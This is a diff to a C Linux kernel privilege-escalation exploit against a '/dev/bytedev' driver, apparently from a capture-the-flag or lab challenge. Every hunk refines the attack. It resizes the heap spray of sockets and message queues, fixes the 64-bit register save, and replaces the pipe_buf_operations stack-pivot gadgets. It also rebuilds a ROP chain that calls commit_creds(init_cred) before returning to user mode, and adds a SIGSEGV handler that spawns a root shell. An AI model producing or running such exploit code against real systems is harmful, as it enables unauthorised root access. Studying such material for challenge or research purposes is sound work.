@@ -13,6 +13,7 @@
 #include <sys/socket.h>
 #include <sys/syscall.h>
 #include <sys/ioctl.h>
+#include <signal.h>
 
 #define PRIMARY_MSG_SIZE 0x1000
 #define SECONDARY_MSG_SIZE 0x400
@@ -22,7 +23,7 @@
 #define VICTIM_MSG_TYPE     0x1337
 #define MSG_TAG     0xAAAAAAAA
 
-#define SOCKET_NUM 16
+#define SOCKET_NUM 32
 #define SK_BUFF_NUM 128
 #define PIPE_NUM 256
 #define MSG_QUEUE_NUM 4096
@@ -31,8 +32,10 @@
 #define PREPARE_KERNEL_CRED 0xffffffff810b3160
 #define INIT_CRED 0xffffffff8244aca0
 #define COMMIT_CREDS 0xffffffff810b2ec0
-#define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81a01050
+#define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81a01086
 #define POP_RDI_RET 0xffffffff810014f9
+#define SWAPGS_RET 0xffffffff818895f9
+#define IRETQ 0xffffffff81a01117
 
 #define BYTEDEV_BUF_SIZE (4096 - sizeof(struct bytedev_data))
 
@@ -104,17 +107,17 @@ struct pipe_buf_operations
     uint64_t    get;
 };
 
-size_t user_cs, user_ss, user_sp, user_eflags;
+size_t user_cs, user_ss, user_rflags, user_sp;
 
 void saveStatus()
 {
     __asm__("mov user_cs, cs;"
             "mov user_ss, ss;"
-            "mov user_sp, esp;"
+            "mov user_sp, rsp;"
             "pushf;"
-            "pop user_eflags;"
+            "pop user_rflags;"
             );
-    printf("\033[34m\033[1m[*] Status has been saved.\033[0m\n");
+    puts("\033[34m\033[1m[*] Status has been saved.\033[0m");
 }
 
 void errExit(char *msg)
@@ -184,7 +187,7 @@ void trigerOutOfBoundWrite(int dev_fd, int socket_fd[2])
 
     /* free the first buffer in bytedev queue */
     trash_data = malloc(BYTEDEV_BUF_SIZE);
-    memset(trash_data, 0x54, BYTEDEV_BUF_SIZE);
+    memset(trash_data, 0xc4, BYTEDEV_BUF_SIZE);
 
     printf("[*] write %d bytes to dev \n", 
             write(dev_fd, trash_data, BYTEDEV_BUF_SIZE));
@@ -215,6 +218,11 @@ void getRootShell(void)
     system("/bin/sh");
 }
 
+void signalHandler(int signum)
+{
+    getRootShell();
+}
+
 int main(int argc, char **argv, char **envp)
 {
     int         oob_socket[2];
@@ -236,6 +244,7 @@ int main(int argc, char **argv, char **envp)
 
     /* Initialization */
     saveStatus();
+    signal(SIGSEGV, signalHandler); 
 
     if ((dev_fd = open("/dev/bytedev", O_RDWR)) < 0) {
         errExit("failed to open bytedev!");
@@ -311,7 +320,7 @@ int main(int argc, char **argv, char **envp)
     victim_qid = real_qid = -1;
     for (int i = 0; i < MSG_QUEUE_NUM; i++)
     {
-        if ((i % 1024) == 0)  // the hole
+        if ((i % 512) == 0)  // the hole
             continue;
 
         if (peekMsg(msqid[i], &secondary_msg, 
@@ -501,20 +510,29 @@ int main(int argc, char **argv, char **envp)
      * TODO: gadget there should be fixed
      */
     ops_ptr = (struct pipe_buf_operations *) fake_secondary_msg;
-    ops_ptr->release = 0xffffffff8183b4d3 + kernel_offset;// push rsi ; pop rsp ; add [rbp-0x3d],bl ; ret
-    ops_ptr->confirm = 0xffffffff81689ea4 + kernel_offset;// pop rdx ; pop r13 ; pop rbp ; ret
+    /* push rsi ; pop rsp ; pop rbx ; pop r12 ; ret */
+    ops_ptr->release = 0xffffffff81330a28 + kernel_offset;
+    /* ret */
+    ops_ptr->get = 0xffffffff81330a35 + kernel_offset;
 
     rop_idx = 0;
     rop_chain = (uint64_t*) &fake_secondary_msg[0x20];
     rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;
     rop_chain[rop_idx++] = kernel_offset + INIT_CRED;
     rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;
-    rop_chain[rop_idx++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + 22;
+    /**
+     * XXX: swapgs_restore_regs function seems no more available,
+     * so we reuse the swapgs ; ret ; iretq
+     */
+    /*
+    rop_chain[rop_idx++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE;
     rop_chain[rop_idx++] = *(uint64_t*) "arttnba3";
-    rop_chain[rop_idx++] = *(uint64_t*) "arttnba3";
+    rop_chain[rop_idx++] = *(uint64_t*) "arttnba3";*/
+    rop_chain[rop_idx++] = kernel_offset + SWAPGS_RET;
+    rop_chain[rop_idx++] = kernel_offset + IRETQ;
     rop_chain[rop_idx++] = (size_t) getRootShell;
     rop_chain[rop_idx++] = user_cs;
-    rop_chain[rop_idx++] = user_eflags;
+    rop_chain[rop_idx++] = user_rflags;
     rop_chain[rop_idx++] = user_sp;
     rop_chain[rop_idx++] = user_ss;
 
